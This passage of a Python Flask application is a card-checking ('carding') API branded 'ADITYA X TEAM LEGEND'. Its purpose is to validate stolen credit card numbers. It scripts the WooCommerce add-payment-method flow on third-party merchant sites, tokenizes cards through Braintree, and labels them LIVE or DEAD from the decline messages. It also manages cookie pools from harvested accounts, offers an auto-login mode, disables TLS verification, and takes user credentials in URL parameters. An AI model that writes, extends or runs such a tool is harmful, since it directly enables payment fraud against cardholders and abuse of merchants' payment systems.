                'Time': round(time.time() - start_time, 2)
            }
        
        # No success message = Card not added = DEAD
        logging.error(f"❌ Card not added to payment method")
        return {
            'CC': cc,
            'Status': 'DEAD',
            'Response': 'Card declined - Payment method not added',
            'Time': round(time.time() - start_time, 2)
        }
        
    except requests.Timeout:
        logging.error(f"⏱️ Timeout")
        return {
            'CC': cc,
            'Status': 'DEAD',
            'Response': 'Timeout',
            'Time': round(time.time() - start_time, 2)
        }
    except requests.RequestException as e:
        logging.error(f"❌ Request Error: {str(e)}")
        return {
            'CC': cc,
            'Status': 'DEAD',
            'Response': 'Request failed',
            'Time': round(time.time() - start_time, 2)
        }
    except Exception as e:
        logging.error(f"❌ Error: {str(e)}")
        return {
            'CC': cc,
            'Status': 'DEAD',
            'Response': f'Error: {str(e)[:50]}',
            'Time': round(time.time() - start_time, 2)
        }


def check_braintree_card_sensorex(cc, cookies_str):
    """Braintree card checking for sensorex.com"""
    start_time = time.time()
    
    try:
        card_parts = cc.split('|')
        if len(card_parts) != 4:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Invalid format. Use: CARD|MM|YY|CVV',
                'Time': round(time.time() - start_time, 2)
            }
        
        ccn, mm, yy, cvc = card_parts
        if len(yy) == 2:
            yy = '20' + yy
        
        cookies_dict = {}
        for cookie in cookies_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies_dict[key.strip()] = value.strip()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        logging.info("📄 [SENSOREX] Step 1: Getting page...")
        page_response = requests.get(
            'https://sensorex.com/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            verify=False
        )
        
        page_content = page_response.text
        
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', page_content)
        if not nonce_match:
            if 'wp-login.php' in page_content or 'login' in page_response.url.lower():
                return {'CC': cc, 'Status': 'DEAD', 'Response': 'Invalid cookies', 'Time': round(time.time() - start_time, 2)}
            return {'CC': cc, 'Status': 'DEAD', 'Response': 'Could not find nonce', 'Time': round(time.time() - start_time, 2)}
        woocommerce_nonce = nonce_match.group(1)
        
        client_nonce_match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', page_content)
        if not client_nonce_match:
            return {'CC': cc, 'Status': 'DEAD', 'Response': 'Could not find client_token_nonce', 'Time': round(time.time() - start_time, 2)}
        client_nonce = client_nonce_match.group(1)
        
        logging.info("🔑 [SENSOREX] Step 2: Getting client token...")
        token_response = requests.post(
            'https://sensorex.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies_dict,
            data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce},
            timeout=15,
            verify=False
        )
        
        token_data = token_response.json()
        if not token_data.get('success'):
            return {'CC': cc, 'Status': 'DEAD', 'Response': 'Failed to get client token', 'Time': round(time.time() - start_time, 2)}
        
        client_token_encoded = token_data.get('data')
        
        logging.info("🔓 [SENSOREX] Step 3: Decoding token...")
        client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
        authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
        
        logging.info("💳 [SENSOREX] Step 4: Tokenizing card...")
        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers={
                'Content-Type': 'application/json',
                'Braintree-Version': '2018-05-10',
                'Authorization': f'Bearer {authorization_fingerprint}'
            },
            json={
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {"creditCard": {"number": ccn, "expirationMonth": mm, "expirationYear": yy, "cvv": cvc}, "options": {"validate": False}}}
            },
            timeout=15,
            verify=False
        )
        
        tokenize_data = tokenize_response.json()
        if 'errors' in tokenize_data:
            return {'CC': cc, 'Status': 'DEAD', 'Response': f'Tokenize error: {tokenize_data["errors"][0].get("message")}', 'Time': round(time.time() - start_time, 2)}
        
        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
        
        logging.info("🚀 [SENSOREX] Step 5: Submitting...")
        
        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"
        
        form_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://sensorex.com',
            'referer': 'https://sensorex.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        payment_response = requests.post(
            'https://sensorex.com/my-account/add-payment-method/',
            headers=form_headers,
            cookies=cookies_dict,
            data={
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': card_type,
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': payment_token,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'i13_recaptcha_payment_method_token': '',
                'woocommerce-add-payment-method-nonce': woocommerce_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            },
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        response_text = payment_response.text
        
        # Debug logging
        logging.info(f"📊 [SENSOREX] Response URL: {payment_response.url}")
        logging.info(f"📊 [SENSOREX] Response Status: {payment_response.status_code}")
        
        error_match = re.search(r'<ul[^>]*class=["\'][^"\']*woocommerce-error[^"\']*["\'][^>]*>(.*?)</ul>', response_text, re.DOTALL)
        if error_match:
            li_matches = re.findall(r'<li[^>]*>(.*?)</li>', error_match.group(1), re.DOTALL)
            if li_matches:
                error_msg = re.sub(r'<[^>]+>', '', li_matches[0]).strip()
                error_msg = ' '.join(error_msg.split())
                
                if any(k in error_msg.lower() for k in ['insufficient funds', 'cvv', 'security code', 'incorrect_cvc']):
                    return {'CC': cc, 'Status': 'LIVE', 'Response': error_msg, 'Time': round(time.time() - start_time, 2)}
                return {'CC': cc, 'Status': 'DEAD', 'Response': error_msg, 'Time': round(time.time() - start_time, 2)}
        
        # Check for success message with card type extraction
        success_match = re.search(r'Nice!\s+New payment method added:\s+(\w+)', response_text, re.IGNORECASE)
        if success_match:
            card_name = success_match.group(1)
            success_msg = f"Nice! New payment method added: {card_name}"
            logging.info(f"✅ [SENSOREX] SUCCESS: {success_msg}")
            return {'CC': cc, 'Status': 'LIVE', 'Response': success_msg, 'Time': round(time.time() - start_time, 2)}
        
        if any(s in response_text.lower() for s in ['payment method added', 'woocommerce-message']):
            return {'CC': cc, 'Status': 'LIVE', 'Response': '1000: Approved ✓', 'Time': round(time.time() - start_time, 2)}
        
        return {'CC': cc, 'Status': 'DEAD', 'Response': 'Card declined', 'Time': round(time.time() - start_time, 2)}
        
    except Exception as e:
        return {'CC': cc, 'Status': 'DEAD', 'Response': f'Error: {str(e)[:50]}', 'Time': round(time.time() - start_time, 2)}


@app.route('/check', methods=['GET'])
def check_card():
    """
    Braintree Card Check - Iditarod.com Method
    Format: /check?cc=CARD|MM|YY|CVV or /check?cc=CARD|MM|YY|CVV&cookies=COOKIE_STRING
    """
    
    cc = request.args.get('cc', '')
    cookies_str = request.args.get('cookies', DEFAULT_COOKIES_IDITAROD)
    
    if not cc:
        return jsonify({
            'status': 'error',
            'message': 'CC parameter required. Format: /check?cc=CARD|MM|YY|CVV or /check?cc=CARD|MM|YY|CVV&cookies=YOUR_COOKIES'
        }), 400
    
    logging.info(f"🔍 Checking card: {cc[:4]}...{cc[-4:]}")
    
    try:
        result = check_braintree_card(cc, cookies_str)
        
        response_data = OrderedDict([
            ('CC', result['CC']),
            ('Status', result['Status']),
            ('Response', result['Response']),
            ('Time', result['Time']),
            ('Dev', 'ADITYA X ⚡TEAM LEGEND')
        ])
        
        logging.info(f"✅ Response sent: {result['Status']} - {result['Response'][:50]}")
        return json_response(response_data)
    
    except Exception as e:
        logging.error(f"❌ Endpoint Error: {str(e)}")
        return jsonify({
            'CC': cc,
            'Status': 'DEAD',
            'Response': f'Server error: {str(e)[:100]}',
            'Time': 0,
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/check2', methods=['GET'])
def check_card_sensorex():
    """
    Braintree Card Check - Sensorex.com Method
    Format: /check2?cc=CARD|MM|YY|CVV or /check2?cc=CARD|MM|YY|CVV&cookies=COOKIE_STRING
    """
    
    cc = request.args.get('cc', '')
    cookies_str = request.args.get('cookies', DEFAULT_COOKIES_SENSOREX)
    
    if not cc:
        return jsonify({
            'status': 'error',
            'message': 'CC parameter required. Format: /check2?cc=CARD|MM|YY|CVV or /check2?cc=CARD|MM|YY|CVV&cookies=YOUR_COOKIES'
        }), 400
    
    logging.info(f"🔍 [SENSOREX] Checking card: {cc[:4]}...{cc[-4:]}")
    
    try:
        result = check_braintree_card_sensorex(cc, cookies_str)
        
        response_data = OrderedDict([
            ('CC', result['CC']),
            ('Status', result['Status']),
            ('Response', result['Response']),
            ('Time', result['Time']),
            ('Site', 'Sensorex.com'),
            ('Dev', 'ADITYA X ⚡TEAM LEGEND')
        ])
        
        logging.info(f"✅ [SENSOREX] Response: {result['Status']}")
        return json_response(response_data)
    
    except Exception as e:
        logging.error(f"❌ [SENSOREX] Error: {str(e)}")
        return jsonify({
            'CC': cc,
            'Status': 'DEAD',
            'Response': f'Server error: {str(e)[:100]}',
            'Time': 0,
            'Site': 'Sensorex.com',
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/auto', methods=['GET'])
def check_card_auto():
    """
    Auto-Login Card Checker (RECOMMENDED)
    Format: /auto?cc=CARD|MM|YY|CVV
    No cookies needed - automatically logs in, fills address, and checks card!
    """
    
    cc = request.args.get('cc', '')
    
    if not cc:
        return jsonify({
            'status': 'error',
            'message': 'CC parameter required. Format: /auto?cc=CARD|MM|YY|CVV'
        }), 400
    
    logging.info(f"🚀 [AUTO] Checking card: {cc[:4]}...{cc[-4:]}")
    
    try:
        result = check_braintree_card_auto_login(cc)
        
        response_data = OrderedDict([
            ('CC', result['CC']),
            ('Status', result['Status']),
            ('Response', result['Response']),
            ('Time', result['Time']),
            ('Mode', 'Auto-Login'),
            ('Gateway', 'Braintree auth'),
            ('Dev', 'ADITYA X ⚡TEAM LEGEND')
        ])
        
        logging.info(f"✅ [AUTO] Response: {result['Status']} - {result['Response'][:50]}")
        return json_response(response_data)
    
    except Exception as e:
        logging.error(f"❌ [AUTO] Error: {str(e)}")
        return jsonify({
            'CC': cc,
            'Status': 'DEAD',
            'Response': f'Server error: {str(e)[:100]}',
            'Time': 0,
            'Mode': 'Auto-Login',
            'Gateway': 'Braintree auth',
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/refresh', methods=['GET'])
def refresh_cookies():
    """
    Refresh Cookie Pool
    Manually refresh all cookies when needed
    """
    try:
        logging.info("🔄 Manual cookie refresh requested...")
        count = refresh_all_cookies()
        
        cookie_info = []
        for cookie in COOKIE_POOL:
            age_hours = (time.time() - cookie['timestamp']) / 3600
            cookie_info.append({
                'email': cookie['email'],
                'age_hours': round(age_hours, 2)
            })
        
        return jsonify({
            'status': 'success',
            'message': f'Successfully refreshed {count}/{len(ACCOUNTS)} accounts',
            'total_cookies': len(COOKIE_POOL),
            'cookies': cookie_info,
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        })
    except Exception as e:
        logging.error(f"❌ Refresh error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Error refreshing cookies: {str(e)}',
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/status', methods=['GET'])
def cookie_status():
    """
    Cookie Pool Status
    Check the current status of cookie pool
    """
    try:
        cookie_info = []
        for i, cookie in enumerate(COOKIE_POOL):
            age_hours = (time.time() - cookie['timestamp']) / 3600
            expires_in = (COOKIE_MAX_AGE / 3600) - age_hours
            cookie_info.append({
                'index': i + 1,
                'email': cookie['email'],
                'age_hours': round(age_hours, 2),
                'expires_in_hours': round(expires_in, 2),
                'status': 'fresh' if expires_in > 1 else 'expiring_soon'
            })
        
        return jsonify({
            'total_cookies': len(COOKIE_POOL),
            'total_accounts': len(ACCOUNTS),
            'cookies': cookie_info,
            'cookie_max_age_hours': COOKIE_MAX_AGE / 3600,
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e),
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/key-@teamlegendno1/gate-b3', methods=['GET'])
def gate_b3_check():
    """
    Team Legend Gate B3 - Multi-User Card Checker
    Format: /key-@teamlegendno1/gate-b3?cc=CARD|MM|YY|CVV&email=USER_EMAIL&pass=USER_PASSWORD
    Users provide their own iditarod.com credentials
    Cookies are auto-saved and refreshed every 24 hours
    """
    
    cc = request.args.get('cc', '')
    email = request.args.get('email', '')
    password = request.args.get('pass', '')
    
    if not cc or not email or not password:
        return jsonify({
            'status': 'error',
            'message': 'Required: cc, email, pass parameters',
            'format': '/key-@teamlegendno1/gate-b3?cc=CARD|MM|YY|CVV&email=your@email.com&pass=yourpassword',
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 400
    
    logging.info(f"🔍 [GATE-B3] User: {email[:10]}... | Card: {cc[:4]}...{cc[-4:]}")
    
    try:
        result = check_card_with_user_auth(cc, email, password)
        
        response_data = OrderedDict([
            ('CC', result['CC']),
            ('Status', result['Status']),
            ('Response', result['Response']),
            ('Time', result['Time']),
            ('Gateway', result['Gateway']),
            ('Dev', 'ADITYA X ⚡TEAM LEGEND')
        ])
        
        logging.info(f"✅ [GATE-B3] {email[:10]}... -> {result['Status']} - {result['Response'][:50]}")
        return json_response(response_data)
    
    except Exception as e:
        logging.error(f"❌ [GATE-B3] Error for {email[:10]}...: {str(e)}")
        return jsonify({
            'CC': cc,
            'Status': 'DEAD',
            'Response': f'Server error: {str(e)[:100]}',
            'Time': 0,
            'Gateway': 'Braintree',
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        }), 500


@app.route('/', methods=['GET'])
def home():
    """API documentation"""
    return jsonify({
        'message': 'Braintree Auth API - Multi-User System - ADITYA X ⚡TEAM LEGEND',
        'main_endpoint': {
            '/key-@teamlegendno1/gate-b3': 'Multi-user card checker (RECOMMENDED - 3000+ users supported!)'
        },
        'method': 'GET',
        'parameters': {
            'cc': 'Card format: CARD|MM|YY|CVV (required)',
            'email': 'Your iditarod.com account email (required)',
            'pass': 'Your iditarod.com account password (required)'
        },
        'example': '/key-@teamlegendno1/gate-b3?cc=4111111111111111|12|2025|123&email=your@email.com&pass=yourpassword',
        'features': [
            'Auto cookie management per user',
            'Cookies saved and auto-refreshed every 24 hours',
            'No cookie expiration issues',
            'Supports 3000+ concurrent users',
            'Each user uses their own iditarod.com account'
        ],
        'live_indicators': [
            'Insufficient funds',
            'CVV mismatch',
            'Security code error',
            '1000: Approved'
        ],
        'dead_indicators': [
            'risk_threshold',
            'Rate limit',
            'Card declined',
            'Invalid card'
        ]
    })


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
